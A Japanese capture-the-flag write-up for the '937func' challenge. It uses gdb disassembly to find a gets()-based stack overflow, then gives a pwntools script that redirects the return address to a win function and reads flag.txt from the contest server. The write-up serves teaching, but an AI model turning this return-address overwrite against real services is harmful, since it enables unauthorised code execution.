# nag0m1CTF

https://nag0mictf.tk

## pwnable

### 937func

> If you get the "win" function, you get the treasure. Can you get it?
> 
> nc 3.18.62.210 11002

詳細な説明は**DreamWorld**にて行っているので省略します．

この問題はリターンアドレス書き換え問題となっています．

前問と同様に**gdb**を使用します．

```
> gdb 937func
gdb-peda$ disassemble main
Dump of assembler code for function main:
   0x0000000000400707 <+0>:     push   rbp
   0x0000000000400708 <+1>:     mov    rbp,rsp
   0x000000000040070b <+4>:     sub    rsp,0x20
   0x000000000040070f <+8>:     mov    QWORD PTR [rbp-0x20],0x0
   0x0000000000400717 <+16>:    mov    QWORD PTR [rbp-0x18],0x0
   0x000000000040071f <+24>:    mov    QWORD PTR [rbp-0x10],0x0
   0x0000000000400727 <+32>:    mov    QWORD PTR [rbp-0x8],0x0
   0x000000000040072f <+40>:    call   0x400687 <setup>
   0x0000000000400734 <+45>:    lea    rdi,[rip+0xc5]        # 0x400800
   0x000000000040073b <+52>:    call   0x400560 <puts@plt>
   0x0000000000400740 <+57>:    lea    rax,[rbp-0x20]
   0x0000000000400744 <+61>:    mov    rdi,rax
   0x0000000000400747 <+64>:    call   0x400580 <gets@plt>
   0x000000000040074c <+69>:    mov    eax,0x0
   0x0000000000400751 <+74>:    leave
   0x0000000000400752 <+75>:    ret
End of assembler dump.
```

今回注目するのは`0x0000000000400747 <+64>:    call   0x400580 <gets@plt>`の箇所です．

gets関数はセキュリティ上よくないと言われている関数です．

<br>

ひとまずたくさんの文字を送り込んでみます．

```
echo "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" | nc 3.18.62.210 11002
Do you jump the "win" function?
timeout: the monitored command dumped core
Segmentation fault
```

たくさんの文字を送ることで`Segmentation fault`を起こしています．

これが起きてしまうのがgets関数です．

<br>

ここで疑問は，問題文にwin関数があると言っているのに，main関数にはどこにもないという点です．

ちなみにsetup関数にもありません．

<br>

解法としては，main関数内に`0x000000000040074c <+69>:    mov    eax,0x0`になっており，returnアドレスがあるという点です．

getsの箇所でwin関数に飛ばすようにすることでシェルコード獲得できます．

returnアドレスはrbpからの8byteで記載されています．

したがって，**pwntools**のコードを用いて以下のコードを使用すると求められます．

<br>

最後に，win関数のアドレスを知る必要があります．

これは，gdbで知ることができます．

```
gdb-peda$ disassemble win
Dump of assembler code for function win:
   0x00000000004006e8 <+0>:     push   rbp
   0x00000000004006e9 <+1>:     mov    rbp,rsp
   0x00000000004006ec <+4>:     lea    rdi,[rip+0xf5]        # 0x4007e8
   0x00000000004006f3 <+11>:    call   0x400560 <puts@plt>
   0x00000000004006f8 <+16>:    lea    rdi,[rip+0xf5]        # 0x4007f4
   0x00000000004006ff <+23>:    call   0x400570 <system@plt>
   0x0000000000400704 <+28>:    nop
   0x0000000000400705 <+29>:    pop    rbp
   0x0000000000400706 <+30>:    ret
End of assembler dump.
```

`0x00000000004006e8 <+0>:     push   rbp`の箇所より，`0x00000000004006e8`という値を入手できます．

<br>

以上の内容から，gets関数でrbp-0x20からの入力になるため，20文字分のデータを入力したのち，win関数のアドレスを入力することで求められます．

上記の手順でプログラムを実行した際にうまくいかないことがあります．

このときは，main関数の最終文にある`ret`のアドレスを入れたのちにwin関数のアドレスを入力してください．

詳細は省かせていただきます．

```
from pwn import *

data = b'a' * 0x20 + p64(0x400752) + p64(0x4006ec)
print(data)
print(type(data))

# io = process("./937func")
io = remote("3.18.62.210", 11002)
print(io.readline())
io.sendline(data)
print(io.readline())
# io.interactive()
io.sendline(b"cat flag.txt")
print(io.readline())
```

これを実行すると以下のようになります．

```
> python3 937func.py
[+] Opening connection to 3.18.62.210 on port 11002: Done
b'Do you jump the "win" function?\n'
b'You got it!\n'
b'nag0m1{I7_i5_difficu17_7o_3nt3r_7he_c0rr3ct_4ddre55}\n'
```

